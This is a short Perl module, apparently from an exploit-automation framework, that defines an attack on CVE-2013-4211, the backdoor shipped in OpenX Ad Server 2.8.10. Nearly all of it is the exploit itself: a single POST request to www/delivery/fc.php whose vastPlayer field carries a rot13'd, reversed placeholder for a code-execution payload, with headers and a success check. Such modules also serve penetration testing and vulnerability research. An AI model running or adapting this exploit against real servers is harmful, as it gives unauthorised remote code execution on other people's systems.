package OPENX::MSF::OpenxBackdoorPhp;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "OpenxBackdoorPhp";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-4211",
  DESCRIPTION => "

        OpenX Ad Server version 2.8.10 was shipped with an obfuscated

        backdoor since at least November 2012 through August 2013.

        Exploitation is simple, requiring only a single request with a

        rot13'd and reversed payload.

      ",
  MSF_MODULE => "openx_backdoor_php",
  OSVDB => 96073,
  REFERENCES => [
    "http://www.heise.de/security/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html",
    "http://forum.openx.org/index.php?showtopic=503521628",
  ],
  TITLE => "OpenX Backdoor PHP Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'www/delivery/fc.php',
      PAYLOAD      => 'vastPlayer=__QNBYLNC__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /www/delivery/fc.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
